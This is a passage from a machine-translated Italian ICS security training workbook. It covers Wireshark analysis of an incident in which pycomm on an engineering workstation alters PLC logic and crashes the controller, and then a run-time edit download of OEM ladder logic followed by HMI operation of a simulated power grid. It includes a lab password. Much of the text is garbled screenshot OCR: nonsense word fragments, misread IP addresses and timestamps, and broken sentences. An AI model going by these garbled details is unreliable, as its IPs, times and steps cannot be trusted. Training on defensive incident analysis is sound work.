34 6.499400 10.16.20.10 10.10.10.30 TCP

*Nota* Questo filtrerà la sessione fino a tcp.stream eq 0 come filtro. Ci sono numerosi flussi e loro
sono ordinati numericamente a partire da 0. Sfortunatamente, vediamo che questo flusso non ha nulla
utile.

(nse u” BBAC>

Wireshark: segui il flusso TCP (tcp.stream eq 0)

otincide.pcap

4 @.103838 ]
33 6.494983 |

34 8.499406 Bt Ste
35 0,499416 }

59 6.665626 | es
|

|

144 1.167166j
Frame 1: 242 byte su cavo (1936 bit), 24
Ethernet II, Origine: Dell_3c:53:0b (f8:db:88:
Protocollo Internet versione 4, origine: 10.10.18
Protocollo di controllo della trasmissione, porta Src: 2...
Ethernet/iP (protocollo industriale), Sessia
Protocollo industriale comune

80 ©0 be 5a 72 ce fa db 68 3c 53 eb f
© 08 ed b7 84 40 69 GO BG 10 54 Oa Gat

© 2021, Robert M. Lee Lab 3.3-5
> Filtra su tcp.stream 1

Uscire dalla finestra TCP Stream che era aperta
Applicare il filtro tcp.stream eq 1

Fare clic sul primo pacchetto

Fare clic con il tasto destro e seguire > Flusso TCP
Esamina il traffico

VVVVV

. 369657 18.18.10.26

+ 373803 18.10.16.26 «COMM. +562-2

9 8.375686 18.10.20.16

16 6.375867 16.10.10.20

11 6.377849 10.10,20.18

12 6.378051 10.10.10.20
13 6.385692 16.10.20.18

14 8.385989 16.10.26

15 8.388742 10.10.20.16
16 6.389941 16.16.10.20

ame 5: 66 byte su cavo (528 bit), 66 B
II, Origine: Dell_3¢:53:0a (f8:db:88
Protocollo Internet Versione 4, Src: 10.10.14
«Protocollo di controllo dell'ammissione». porto: 4

*Nota* Qui vediamo che pycomm è su 10.10.10.20 e interagisce con 10.10.20.10 che è il
Sistema di gestione del bruciatore. Inoltre è chiaro che ci sono molti valori tra cui livelli, timer, ritardo,
e Start che potrebbero avere interazione. Sembra che Engineering Workstation stia sfruttando uno strumento basato su Python
su di esso, che abbiamo visto prima trasferire l'avversario, per interagire e modificare i valori sul PLC.*Nota* Di solito ci sono troppi flussi (e anche qui) per scorrere manualmente ciascun flusso. Questo è
dove strumenti e analisi più avanzati sono utili. Tuttavia, possiamo tornare dove dobbiamo essere
rapidamente concentrandosi esplicitamente sulle comunicazioni CIP sapendo come è fatta l'Engineering Workstation
interagire con il PLC.

*Rispondi* pycomm

4. Qual è la causa principale dell'impatto sulla struttura? Logica manipolata sul controller di sicurezza
> Analizzare le comunicazioni CIP

> Applicare un filtro per enip
> Revisione ad alto livello senza entrare ancora nei dettagli del pacchetto

* Fonte

Informazioni sulla lunghezza del protocollo i:
10.18. “Pacchetto di servizi multipli CIP 242: Ottieni elenco attributi, Ottieni attributo Li.
10.10. cIP 319 Operazione riuscita: pacchetto di servizi multipli: ottieni elenco attributi, ottieni att...
10.10. Sessione Registro ENIP 82 (Req), Sessione: 6xe9980000
10.10. ENIP 82 Registro Sessione (Rsp), Sessione: 6x10024166
10.19. ENIP 78 Elenco Identità (richiesto)
10.18. ENIP 129 Elenco Identità (Rsp), 1756-ENBT/A
10.16 cIP CM 114 Non connesso Invia: Identità - Ottieni tutti gli attributi
16.10 cIP 144 Successo: Identità - Ottieni tutti gli attributi
14 9.385989 10.10. Gestore connessione cIP CM 146 - Inoltro grande aperto (router di messaggi)
15 8.388742 16.10. cIP CM 98 Servizio non supportato: Connection Manager - Large Forward Open
16 8.389041 16.10. Gestore connessione cIP CM 142 - Inoltro aperto (router di messaggi)
17 6.398508 10.10. cIP CM 124 Operazione riuscita: Connection Manager - Inoltra aperto
© 2021, Robert M. Lee Lab 3.3-6

UN)

ehi

> * & &

ex & & ww

7 m7oanqqeneqnneeeeee®®
e noi abbiamo F&F

ua ie’ Lt Ui Lt i U

Le

uC VS Vw noi Ww

*Nota* Sarebbe utile avere un registro di tutti i comandi e i valori inviati nel pre-incidente
cattura dei pacchetti e identificare eventuali anomalie o differenze ora che sappiamo che questa cattura dei pacchetti ha un
incidente in esso. Potresti scrivere uno script per raggiungere questo obiettivo o utilizzare uno strumento professionale ma per l'interesse del tempo
e semplicità possiamo generalmente ricordare che c'erano molti comandi nel pacchetto pre-incidente
catturare pacchetti di servizi multipli, successi TimeDelay e simili, registrati e non registrati
Sessioni. Puoi ordinare per Informazioni e vedere i diversi comandi in Wireshark, ma prima possiamo vedere se c'è qualcosa
si distingue nella cattura.

*Nota* Scorri rapidamente trascinando la barra di scorrimento all'estrema destra di Wireshark.

Informazioni sulla lunghezza del protocollo di destinazione

*Nota* Verso la fine dell'acquisizione vedrai molte ritrasmissioni spurie TCP. In sostanza, il CIP
le comunicazioni non sono più attive o sembrano essere andate offline. Lo esamineremo più da vicino
la domanda successiva. Per ora, scorri fino al punto immediatamente prima delle ritrasmissioni e vedi se riesci a identificarti
qualcosa di interessante.

*Nota* Scorrendo lentamente verso l'alto dall'inizio delle ritrasmissioni possiamo vedere alcuni messaggi di stato che
si distinguono per quello che sono e per il fatto che non erano presenti nella cattura dei pacchetti pre-incidente. L'unico
quello che risalta di più è il messaggio Trasferimento parziale: stato del servizio.

Destinazione _ ____ Informazioni sulla lunghezza del protocollo:

10.10.10.20 cIP 598 Trasferimento parziale: Servizio (0x55)
10.10.20.18 Classe cIP 122 (Ox6b) - Servizio (0x55)
10.10.10.20 CIP 55/7 Trasferimento parziale: Servizio (0x55)
10.10.20.10 Classe CIP 122 (®x6b) - Servizio (0x55)
10.10.10.20 cIP 596 Trasferimento parziale: Servizio (@x55)
10.10.20.10 Classe CIP 122 (0x6b) - Servizio (x55)
16.10.10.20 CIP 558 Trasferimento parziale: Servizio (0x55)
10.10.20.10 Classe CIP 122 (@x6b) - Servizio (0x55)
10.10.10.206 CIP 588 Trasferimento parziale: Servizio (0x55)
10.10.20.10 Classe cIP 122 (®x6b) - Servizio (0x55)
16.10.10.20 cIP 567 Trasferimento parziale: Servizio (0x55)
18.10.20.10 Classe cIP 122 (Ox6b) - Servizio (0x55)

*Nota* Questo messaggio informa che sono in corso trasferimenti di dati tra Engineering Workstation e
il PLC che è indicativo di un cambiamento logico. Questo di per sé non è anomalo ma durante le operazioni e non a
finestra di manutenzione diventa un po' più anormale. Tuttavia, nel contesto di ciò che sappiamo di
file di progetto infetto sulla workstation di ingegneria, ciò crea un caso valido della causa principale dell'impatto
la struttura: la modifica della logica del PLC dalla Engineering Workstation.

*Risposta* La logica del PLC è stata infatti manipolata dall'EWS
© 2021, Robert M. Lee Lab 3.3-7
5. Quando il PLC va offline e perché è probabile che venga ancora visualizzato in rete?
2020-07-16 23:31:29

Il PLC si è bloccato ma la scheda di rete è rimasta online

A questo punto non vogliamo vedere solo le comunicazioni ENIP ma qualunque comunicazione
tra il PLC e l'Engineering Workstation.

> Analizzare esplicitamente le comunicazioni CIP tra il 10.10.10.30 e il 10.10.20.10
Applica un filtro per ip-addr==10.10.10.30 && ip.addr==10.10.20.10

Scorri fino al punto in cui avviene la maggior parte delle ritrasmissioni

Selezionare Visualizza > Formato di visualizzazione dell'ora

Scegli il formato che desideri utilizzare, ad esempio "data e ora dell'anno"

Esaminare i risultati

VVVV WV

| 4594... 3445.508667 16.10.30 10.10.20.10 TcPe 541746 —~ 44818 [ack] Se
.. 3453 .508588 10.18.20.10 10.10.16.30 60 44818 - 1746 [ACK] Se
0 3453 . 508599 10.10.18.30 10.10.20.10° = e

.. 3455 .562230 10.10.20.10 10.10.10.30 60 44818 ~ 1746 [ACK] Se

| 4596... 3455.575476 10.10.20.10 10.10.10.30 TcP 60 44818 - 1746 [ACK] Se

¥ Barra degli strumenti principale =: A,
5 =

Barra degli strumenti Filtra
=] 0 barra degli strumenti wireless
iv) Barra di stato

~ Protocollo "Informazioni sulla lunghezza".

| 10 cIP 242 Pacchetto di servizi multipli: ottieni attributo Li
| ©) Schermo intero Fil |30 TCP 60 44818 -- 1746 [ACK] Seq=384617 Ack=284279 '
¥) Elenco pacchetti \10 TcP 54 1746 ~ 44818 [ACK] Seq=284279 Ack=384618 '
. : ~ 4 30 TCP 60 44818 - 1746 [ACK] Seq=384617 Ack=264279 |
(¥| Dettagli pacchetto 16 TCP. 54.1746 44818. [ACK] Seq=284279 Ack=384618
lv Byte del pacchetto
Ehi dieci. BO AAQAD 4746 PACU Coa =20 4612. Aol —2042990.!
Formato visualizzazione ora Data e ora del giorno (1970-01-01 01:02:03.123456) ctri+aAlt+1
Risoluzione del nome » i Anno, giorno dell'anno e ora del giorno (1970/001 01:02:03.123456)
Ingrandisci » | Ora del giorno (01:02:03.123456) Ctrl+Alt+2
.| Espandi Sottoalberi Maiusc+Destra | Secondi dal 01-01-1970 ctrl+Alt+3
4 Collanse Suhtrees ShiFrat eft | ® Secondi dall'inizio dell'acquisizione Ctrl+Alt+4

. 2020-07-16 23:31:27.514751 19.10.10.30

. 2020-07-16 23:31:29.568382 10.10.20.10

© 2021, Robert M. Lee Lab 3.3 -8

aay @,

a, a, @) aw, a, ey) @)

@)

= Ss 3 Bh ​​8 eee od eee eed
mT rT a mT a cw oT _w

1 secondo

ce

vedi ap

4B

“ap “5 “5 ty

*Nota* Ciò mostra che l'ora è all'incirca il 2020-07-16 23:31:29 UTC quando sono iniziate le ritrasmissioni
accadendo costantemente.

*Nota* È un po' difficile identificarlo con certezza, ma ciò che sembra accadere è che il PLC si è bloccato. COME
scorrendo le ritrasmissioni possiamo vedere che il PLC in realtà è ancora in rete e ha TCP
comunicazioni con 10.10.10.30 ma le comunicazioni CIP effettive non funzionano più.

16.10.20.10 10.10.10.30TCP

10.10.10.30 10.10.20.10TCP

10.10.20.10 10.10.10.30TCP

*Nota* Ciò che probabilmente è successo (e potrebbe essere confermato localmente sul posto) è che il PLC stesso si è bloccato ma
la scheda di interfaccia di rete sul PLC è ancora online. Questo parla della logica del controller stesso
corrotto, il che ha senso nel contesto di ciò che sappiamo. Ciò che non sappiamo però è se lo sarà o meno
l'avversario intendeva mandare in crash il controller. In genere esistono modi più semplici per mandare in crash un controller rispetto a
manipolare la logica. . °

*Risposta* 2020-07-16 23:31:29 e probabile crash del PLC ma la scheda di rete è rimasta online

© 2021, Robert M. Lee Lab 3.3 -9
io, CesCO! CO! CO Co Oh Ld

dobbiamo w& Ww wb we wo w

Vv vw vw

Obiettivi

e Scaricare il PLC con un nuovo file di logica ladder senza interrompere il processo
e Verificare tramite gli strumenti di monitoraggio della rete se il PLC è stato scaricato
e —_ Testare la nuova funzionalità logica del PLC

e Trova indizi per determinare cosa c'è di diverso

*Informazioni sullo scenario* L'OEM della turbina a combustione (CT) ha richiesto l'aggiornamento del sistema di controllo PLC.
Nello specifico, l'OEM ha apportato modifiche alle funzionalità dei controlli della valvola del carburante CT, dopo averle testate
ho inviato a te, ingegnere, un file di logica ladder PLC revisionato da scaricare.

L'OEM ha indicato che il file di logica ladder può essere scaricato come "Run Time Edit". Lo sai come
tecnico che una "Modifica Run Time" consente al PLC di continuare a funzionare durante il download del PLC in modo che il
il download non influenzerà il resto del sistema. In passato, è stato scaricato il codice PLC arrestando il file
PLC dall'esecuzione del codice, hai scaricato il codice e riavviato il PLC inserendolo in Esegui
modalità. In questo specifico scenario di laboratorio, desideri scaricare il codice di nuova generazione senza interrompere il
Trasmissione e distribuzione. Eseguendo una “Rur: Time Edit”, ogni sistema dovrebbe continuare a funzionare
senza effetto.

Dopo che il ruolo di ingegnere ha scaricato il nuovo codice PLC OEM, l'ingegnere verificherà il funzionamento dell'HMI e loro
lavorerà con un tecnico sul campo per verificare le operazioni sul campo.

Questo laboratorio utilizzerà la VM Windows SANS ICS e il kit PLC

Attività: scaricare la logica ladder di modifica del fornitore OEM nel PLC

Hai già scaricato PLC Ladder Logic, ma questa volta eseguirai una "Modifica runtime" in modo che lo stato di
i sistemi di Trasmissione e Distribuzione rimarranno inalterati.

> Caricare il file della logica operativa nel PLC
> Apri la macchina virtuale Windows
> Individuare il file nella cartella ics515: "ICS515 OEM Change V2.ckp"
> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto

© 2021, Robert M. Lee Lab 3.4-1
Software di programmazione CLICK (Versione 3.01) - ICS515¥10 Modifica OEM per Production Boards.ckp - [Programma principale]
Fie "Homes tlt Visualizza la finestra PLE delle istruzioni Setup Progtam

leedhcnd - = ag Cursore | Commenti sul ramo
©) Indirizzo Commenti cou
“Soprannomi signori

Turearnee Somme
Progetto PyWrte 81K Houle,
"Collega £ 3 informazioni | £°)PLC Evo

© Riferimento incrociato
EET

Sotto | Rede

ascia

sì, 3 risposte

Ca NT ar

Programma Funzione PLC Taso
Programma ladder rs | Bsc

eee

Tutto.Avviare | |Ea6} Contatto (NO)

123 Programma Principale Az 1
dl Programma sottoprogramma -
i WA BrestetModele

|B Contatto (NC)
Cal “i Edge Contact

'et Distinguere gli allarmi 2
* Stati distinti
istindustriat |

Genstates ipa Confronta

‘| = DictResAlsrm= |
124 DistRental
$4 DistResstates

eee = Generazione

Catt

Generazione AI _Fuel_Controt 1+]
M4 GenAlarms
1 |Generazione B

> Gen Fuel_Conticl

Un allarme

Ed Genstetes
| hs Iniziato
| A cura di RemoteCommwD

cal
M, reanStates

» Un TeansAlams
Trasmissione del sesso
|| bh Trasduttore >

Chiamata

1B Programma di interruzione sotto
© Selettore indirizzi
| F Modifica commenti rung A

Trasmissione

Chiamata,

Sy Local Program informatico! | |_—_
& Controllo sintassi |
Vista dei riferimenti incrociati 6

TancAlarms

Chiamata

89 Monitorare i |
Monitoraggio dello stato JB
Visualizzazione dati se

> DietResStates

52, pistResiential

~ Peteview delle risorse umane! sonoro
Visualizzazione testo FS

Chiamata

ER Sposa Visualizza |
2 Ignora vista Oe coe

(Bet ieteger al integere2 parole)

[Bl Ficating pomt BlHex (Det

DistResAlarms

c-o1cPu. ee): *

{Al Ascii — 9000/8000

> All'apertura dell'applicazione, trovi nel menu in alto l'icona con la freccia rossa verso il basso che ti serve

Scrivere un progetto in un PLC

Finestra: Aiuto

(El Stile + -
ta) <> Stato FP offline
mile Fs Modalità PLC... [Visualizzazione dati

> Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e
potrebbe essere necessario selezionare l'adattatore nel menu a discesa Adattatore di rete. Se non vedi il

adattatore nel menu a discesa, sarà necessario riassociare l'adattatore da USB a Ethernet all'host

nuovamente e riavviare il tentativo di connessione. Dovresti vedere un PLC che è stato scoperto.

[collegarsi al CLICK PLC x
Questo computer
Connessione diretta
pettwe: aes Posizione del PLC CLICK di destinazione
Adattatori Netecck sea aay Sean RE ROL
Intel(R) 82574. Connessione di rete Gigabit. al di fuori di questa LAN (è necessario assegnare manualmente l'indirizzo IP e il numero di porta.)
Pat altro [picieme Paden | Srboettiack |Parttember | Frowere |jode Senn | Macaddess
B Indirizzo: 192 168.0.8
Maschera di sottorete: 255.255.255.0
Gateway predefinito: 0.0.0.0 |
|
Aggiorna i LED SKRUN BERR Edt.
cono [cometa] He
© 2021, Robert M. Lee Lab 3.4-2

Ce, @,

(2
noi noi WB wo noi oe Oy wy we

Fare clic sul pulsante Connetti
Inserisci la password “sansics123”.

VVV

il programma verrà sostituito con il nuovo programma.

Scrivi il progetto nel PLC

°C
Dimensioni del programma (totale: 8.000 passaggi)
Dimensioni @iProgram: 1.254 passaggi (15,67%)
Area irre: 6.746 passi (84,33%)

Min F)

°8.000|

File di progetto (totale: 262, 144 byte)

Dimensione file WiiProject 41.216 byte (15,72 %)
Area GiFree: 220.928 byte (84,28%)
0 262.144
Ultimo aggiornamento: 29 giugno 2021, 21:21:17
File di progetto Wivarite nel PLC

Abilitando questa opzione, il file di progetto sarà
scaricato (scrittura) nel PLC. Se vuoi disabilitare
caricamento del progetto (lettura), disabilita questa opzione.

Dimensione del programma: 1.220 passi (15,25%)
Area WiFree: 6.780 passi (84,75%)
C) 8.000

‘Progetto Fie (totale: 262, 144 byte)

Dimensione file iProject 40.624 byte (15,49 %)

Area filo: 221.520 byte (84,51%)

°262, 144
Ultimo aggiornamento: 3 29,2021, 20:41:15

Abilitando questa opzione, il programma verrà scaricato nto
il PLC senza commutare la modalità PLC su STOP
modalità.

me ea ae

> - Conferma di voler procedere con la modifica del tempo di RUN

Conferma modifica ora RUN

Quando richiesto, selezionare "Run Time Edit" in modo che il programma PLC continui a funzionare come il vecchio

se

Stai per eseguire una modifica del tempo di RUN. Se preferisci inserire il PLC
modalità STOP quando scarichi il progetto, seleziona il pulsante Annulla
e deselezionare l'opzione Modifica ora di esecuzione nella finestra Scrivi progetto nel PLC.

Non visualizzare più questo messaggio fino al successivo avvio del software.

> Selezionare Procedi modifica RUN time per scaricare il Click PLC

Sssww

COME'

© 2021, Robert M. Lee

Laboratorio 3.4-3
Discrepanza del progetto

prima di eseguire il nuovo progetto.
PC —_—_____ _
Nome del progetto: [ICS515 OGM Modifica v2

Dimensioni del programma (totale: $.000 passi)

Dimensioni GiProgram: 1.254 passaggi (15,67%)
Area WiFree: 6.746 passi (84,33%)
°8.000

File di progetto (totale: 262, 144 byte)
Dimensione file WBProject 41.226 byte (15,72%)

Area WiFree: 220.918 byte (84,28%) |
°282.144
Ultimo aggiornamento: 29 annuncio 2021, 20:24:54
Arrestare il PLC e scaricare il progetto

Stai per scaricare un progetto diverso nel CLICK PLC che attualmente è in modalità RUN.
In questo caso, potresti voler scaricare il progetto in modalità STOP, quindi il PLC CLICK inizializzerà la memoria

PLC
Nome del progetto: [Test di accettazione del sito ICS515 Vi__|

Dimensioni del programma (totale: 8.000 passaggi)

BBDimensione programma: 1.220 passaggi (15,25%)
Area WiFree: 6.780 passi (84,75%)
0 8.000

File di progetto (totale: 262.144 byte)
Dimensione file MiProject 40.614 byte (15,49 %)

Area libera: 221.530 byte (84,51%)
°262.144
Ultimo aggiornamento: 2d 29,2021, 12:34:12

> Verificare che il nuovo codice PLC OEM sia stato scaricato
> Verificare che l'intestazione della finestra indichi "ICS515 OEM Change V2.ckp”

Breakerodee 7% cancella HN Cesare ely Tiras

$f Dieta FesnotahittBalay
Es Disindsiates am

reat F9 HE

Sed Dintrat }

Rema HY Centro Dey Tamar

nuovo
ar

eh Transeo
BW hrcenrupt Pregeam

@ hasdvess Picker
dei commenti di Fe Rung
1} Informazioni sul programma Leeal
1 controllo della sintesi

© Vista Cros Rater
2 Monier
BF satus Mostro | C5518 OFM Modifica V2 - 0 errori, avvisi C}
HE 0° vista “mm
TB Detavewt Scrivi progetto ite PLC.
5 ot Yew + [tanza completata

Intere di generazione su:
'0:Generazione interi

Bek Dloese Bisteeitvorts Blrowing poe ie Mien ci mun

ieee ene. UN,

> Se il tuo FTVlew HMI non è in esecuzione, individua il collegamento "Esegui HMI" sul desktop della VM Windows

> Fai clic su Sì nel prompt e attendi: stanno accadendo cose belle, potrebbero essere necessari 10 secondi, sii paziente

© 2021, Robert M. Lee

Laboratorio 3.4-4

un iN iN

UN,

@

)
ehi noi

ve noi o noi noi

noi noi ww

ww

Sostituisci la directory di sistema locale

Directory di sistema FactoryTalk dell'applicazione per utenti e policy
verrà caricato su questo terminale. Il sistema FactoryTalk esistente
La directory verrà archiviata e verrà ripristinata automaticamente dopo il
l'applicazione runtime è chiusa.

Chiudi tutti gli altri programmi che stanno attualmente accedendo a Local
Elenco di FactoryTalk. Selezionare SÌ per continuare o selezionare NO per annullare

il caricamento di questa Applicazione.
si No
F7 [Fa]

DecomprimereMER.dil in FactoryTalk Linx

Editore verificato: Rockwell Automation
Origine del file: disco rigido su questo computer

Mostra più dettagli

> Selezionare il pulsante "Esegui applicazione".

FactoryTalk View ME Station - 10.00.00.290(Patch 03)

[ iessieva mer

|

| Carica applicazione Esegui applicazione Impostazioni applicazione
iFl SE2] iF3]

‘

Elimina file di registro

Impostazioni del terminale prima dell'esecuzione
IFS)

[Fa]

© 2021, Robert M. Lee

Laboratorio 3.4-5
> Una volta caricato l'HMI, verrà visualizzata la schermata principale. A seconda di come hai lasciato il sistema, tu

vedrà lo stato degli interruttori, i carichi dell'area Residenziale e Industriale.

HMI del sistema BE Power - Principale [limite di 2 ore]

Generazione

|

T n 'Trasmissione,
un intertie LEH
1
Commutatore di uscita MW: relè di protezione dell'interruttore
Apri Chiudi 1 Apri Chiudi | Ripristino guasto

Neeev, 1 NU“e Nat 2
|

7\| | 7 _~*fN
1

Min <> Max
Ehi
wn
} Misuratore di potenza ABR (96)
© 2021 SANS19
Prodotto negli Stati Uniti
Industria

N\ /
Richiusura
Aperto chiuso
4 \
\/
Carico
~~| Min <> Max
7N
{OP AS

Distribuzione

Ora della sveglia
‘pei2021 35542 PH
79912021 3:49:27 PUL
79/2021 3:48:27 PH
yysa021 3.4438 Pu
77872021 2:10:48 Pid
79012021 2:10:48 TEL
7eie02 188:32

«Riconoscilo

Messaggio
Allarme critico valvola carburante
Gene(alion è un allarme critico

Generatore locale Nott Min per chiusura interruttore

Ora garantiremo che le aree di trasmissione, residenziale e di distribuzione industriale siano operative

prima di condurre i test sull'area di generazione

Chiudere l'interruttore industriale

Verificare che l'interruttore Sim 8 - Modalità esperto sia impostato sulla posizione "On".

> Passare alla schermata industriale e chiudere l'interruttore industriale
> Per questo passaggio, lascia entrambe le raffinerie spente

Residenziale

Massimo |

Industriale

Tendenze

90/07/2024
$ 4802 PM

uw Raffineria B
% SU

e.a
tutto su |

© 2021, Robert M. Lee

Laboratorio 3.4-6

a, a, (?, ce, ae,

qe)
ve

~_ w ws

oe ws «a «5 “a

> Chiudi Richiusura residenziale

> Passare alla schermata Residenziale

> Chiudi Richiusura

Generazione

'Ora della sveglia' 'Acenowiedge 'time
77972021 10:50:13 Fossa

“Trasmissione
e distribuzione

Residenziale Industriale

Strada della Casa sul Lago

Strada del Lago Piacevole

Via della trota di lago

Messaggio

vate Cr
Allarme critico per l'area di generazione
Generatore locale NotAt Min Far Interruttore chiuso

Tendenze

Login

~ Carico corrente

Carico massimo

71912024
22:56:32.

0 ora

400| MW.

Generazione

Tr
e distribuzione

sione

Residenziale Industriale

Strada della Casa sul Lago

Strada del Lago Piacevole

AR,

Via della trota di lago

Chse

~~ Carico corrente

Carico massimo

71812024
58:00

Ea

400| MW

Orario dell'allarme Orario di conferma
9/7/2024 0:50.13 PA

Messaggio
Allarme aree residenziali critiche

Min. Natt generatore locale per interruttore chiuso
'Allarme critico nell'area di trasmissione
“La generazione è un braccio critico

J
ee |

© 2021, Robert M. Lee

> Chiudere l'interruttore Lambda della trasmissione e ripristinare il relè di protezione della trasmissione Lambda

Laboratorio 3.4-7
> Passare alla schermata Trasmissione e distribuzione
> Chiudere l'interruttore della trasmissione Lambda
> Ripristina il relè di protezione della trasmissione Lambda

BE Power System HMI - Trans_Dist [Limite di 2 ore} “i

Principali tendenze degli allarmi industriali ideali di generazione
Trasmissione e distribuzione
Generazione
280 MW -- i

arr |
(eo) |) Lamda
| Casa del potere

TRASFERIMENTO AUTOBUS

Lambda | 'Aprire
Trasmissione

Protezione -
Ser” (o) =] |

Consumo di MW
0%

Arai ime Aemowledgetime _ Wessage
0:

7912021 15:55:42
7902024 15:49:27

71912021 2:10:48 PUL

> Resettare eventuali allarmi premendo fisicamente il pulsante “Reset Allarmi” presente sulla scheda C3PO

BB Power System HMI Trans_Dist [Limite di 2 ore] = x

7igi2021
Generazione Residenziale Industriale 23:08:33

TRASFERIMENTO AUTOBUS

Lamda

Richiusura

—|—_

"Alaim time" Riconosci il messaggio in tempo

? 77072024 es 43Pu Allarme Ctico Zona Residenziale
77912024 3:55:42 PL Allarme critico valvola carburante
790/202 15:49:27 "Allarme critico area di generazione".
792021 249.27 PM Generatore locale NotAt Min per interruttore chiuso a
79/2021 15:48:38 "Allarme critico area di trasmissione".
7792021 14:10:48 Allarme critico area di generazione
© 2021, Robert M. Lee Lab 3.4-8

RD BD BO BO PB

> >®

eo ee @

eo

e,
ip 7 u

ww

Bs 4s ae come 45 ae ns a5 is’

COME

> Dovresti vedere la Grid Board che indica che alcuni o tutti i LED delle case residenziali sono accesi.
In caso contrario, ruotare la manopola del potenziometro residenziale completamente in senso orario (al massimo).
i LED della casa sono accesi

> Dovresti vedere il Grid Board che indica un valore per l'area di distribuzione industriale. Se la
il misuratore legge zero, ruotare il potenziometro industriale completamente in senso orario (massimo) in modo che
Il contatore industriale legge circa 20 MW

> Verificare l'operazione di generazione tramite l'HMI di FTView
> Passare alla schermata Generazione

BB Power System HMI - Generazione [Limite di 2 ore] - x
e Trasmissione 2024
Principali Generazione e Distribuzione Allarmi Industriali Residenziali: Tendenze Login 14:13:06 PM ESCI
La valvola del carburante CT controlla lo stato di interblocco della generazione
© Modalità manuale Apri |
© Modalità automatica Fsitt4) Permissivi dell'interruttore |
@ Local Click PLC e O Generator Runnirg {
0 % Aperto © OpenPLe BP OS @ Trans Breaker Cosed
ineulee Meruel i° @ Trans. Relè di protezione
OpenPLC @ Carica presente
Controllo
Turbina a vapore ad aria aspirata
|
°
Un'uscita
Turbina di combustione] tp
0 |Mw
OCT In esecuzione O AVR Acceso Alimentazione Alimentazione Alimentazione
ExpertMode © CT Arrestato @ Modalità manuale attiva Generazione consumo disponibile
SIM 8"
on=Usa pas Star =| Tensione Manuale Industria! 59| MW Locale 0 MW Locale 0 Mw
= . modalità Ames
Of = Avvio automatico = =z Regolazione: Setpoint Residenziale 99.) MW intertie 158 MW intertie 500 mw
oH EaSeee] BAAR: 280 | Mw Totale mw Totale [158] mw Totale [500] MW
Orario sveglia Orario conferma Messaggio
7912021 105013 Pia Allarme Critico Zona Residenziale
7#912021 22:41.23 Allarme Cntcai area trasmissione
77912021 3:55.42 Allarme critico valvola carburante PH
78912021 3:49:27 Allarme critico area generazione Pd: |
71912021 3.49:27 PU Generatore locale Non l Min per interruttore chiuso
7192021 15:44:28 Aree di trasmissione: Allarme
71972021 2:10:48 Allarme critico area generazione PUL

> Impostare la modalità di regolazione della tensione della turbina di combustione su AVR e i controlli della valvola del carburante CT su
PLC locale e modalità automatica

© 2021, Robert M. Lee Lab 3.4-9
BE Power System HMI - Generazione [Limite di 2 ore] = x
Generazione principale | ,trasmissione | Tendenze degli allarmi industriali residenziali ESCI
Stato di interblocco della generazione
Immersione | | Cavolo @ inerzia Su |
pasate: oe SES Breaker Permissivi |
O Generatore in funzione |
| ehi? @ Interruttore Trans Chiuso |
| ri Trad. Relè di protezione |
eee +4 i
. '; { @ Presente perduto
Modalità OpenPic lode 1
| |
| |
Turbina a vapore dell'aria in ingresso |
“120 |°F
0 |uw'
OCT Potenza di marcia Potenza Potenza
Modalità esperto @ generazione consumo interrotta CT disponibile
«Inizio | Industriale 59 «NW Locale Q Mw Locale | | Mw
. Residenziale 99 | MW intertie [__ 188 | MW Intertie | 500| MW
naso | Pais aise MWI Totale uw Totale [ 158 | mw =Totale | 500| MW
Tempo di allarme "Saggio di conferma del tempo".
79/2021 22:50:13 Allarme Critico Area Residenziale
08/07/2021 1061.23 PH ‘Area di trasmissione Alar Critico
719i2021 25642 Pua Allarme critico valvola carburante
749/202 15:49:27 Ganerstion Area Cotticat Harm
79/2021 348,27 PU Generatore Locale Nott lin Per Bresker Chiuso
09/07/2021 3.44:38 Trasmissione PIA 4rea Allarme critico
71972021 2:10:48 Generazione PA rea Allarme critico

> Avviare la Turbina di Combustione premendo il pulsante “Start” e verrà visualizzato il messaggio “CT
Se si esegue “L'indicatore e i MW di uscita del generatore aumenteranno fino a 1 MW.

2a f&&w&S

eo®*®&B&B

* Nota: il generatore deve essere in funzione al valore minimo dell'interruttore di chiusura del piazzale prima del
L'interruttore del commutatore può chiudersi. In questo sistema di laboratorio, il Minimum Switchyard Close Breaker
il valore è IMW.

BB Power System HMI - Generazione [Limite di 2 ore} = x

e®@®

Generazione

Trasmetti
e distribuzione

Controlli della valvola del carburante CT

hl

FornoPte | manst | [00

O Modalità manuale
© Modalità automatica

% Aprire

Aria in ingresso

Generazione

Tendenze

@ Locale Fare clic su PLC © Generatore in funzione
Ct] % Apertura © OpenPLe @ Trans. Interruttore chiuso
Relè di protezione trans icin iw H
'Modalità OpenPLC Modalità presente
Setpoint di controllo del controllo

Turbina a vapore

Stato dell'interblocco

@ intertie Oo
Permessi dell'interruttore

Turbina a combustione
Lecennle AVR On Power Power Power |
Modalità esperto interrotta C) Modalità manuale attiva sulla generazione del consumo disponibile
/oltage pri Industrial 5a | MW Locale 1 MW Locale 0 MW
lode seeeeiareen sono ———
Setpoint: Residenziale 99 | MW intertie |__ 158 Mw intertie [500 wwf
= Mw Totale uw Totale 159 mw = Totale | 500 Mw
Sono il messaggio attuale
p «7972021105013 PM |Allarme critico area
19/2024 10.41.23 Pd Trasmissione rea Allarme Critico
792021 3:55:42 Pla Valvola Carburante Critica Nar
71912021 3:49:27 Allarme critico per l'area di generazione Pla
77912021 3:49:27 PH Generatore locale Nott in For Grezker Chiuso
79120213 44:38 PM 'Allarme critico area di trasmissione
08/07/2021 14:10:4B PM Allarme critico per l'area di generazione:

© 2021, Robert M. Lee

Laboratorio 3.4-10

)

)

)

)

"777T7TODOD®
ew ww

un ww

ww w se w

ip

TY

> Chiudere l'interruttore del piazzale premendo il pulsante "Chiudi".

> Dovresti vedere aumentare la produzione di MW per soddisfare la domanda del settore residenziale e

Carichi industriali

N

BE Power System HII - Generazione [2 ore di illuminazione]

Trasmissione

Generazione |" Distribuzione

Residenziale Industriale

Generazione di controlli della valvola del carburante CT

= © Modalità manuale. |
5 J @ Modalità automatica Desideroso)

@ Locale Fare clic su PLC
36| % Apri O OpenPic
Locale o Manuale
'Modalità OpenPLC Levan

Controllo

Login

71812024

23:26:30

Stato dell'interblocco

Turbina a vapore

@ imertie On

Permessi dell'interruttore
eratore in esecuzione

ron. Interruttore chiuso
@Trad. Relè di protezione
@ Carica presente

1
|
|
|
|

Uscita |
Turbina di combustione q |
“154 | MW a |
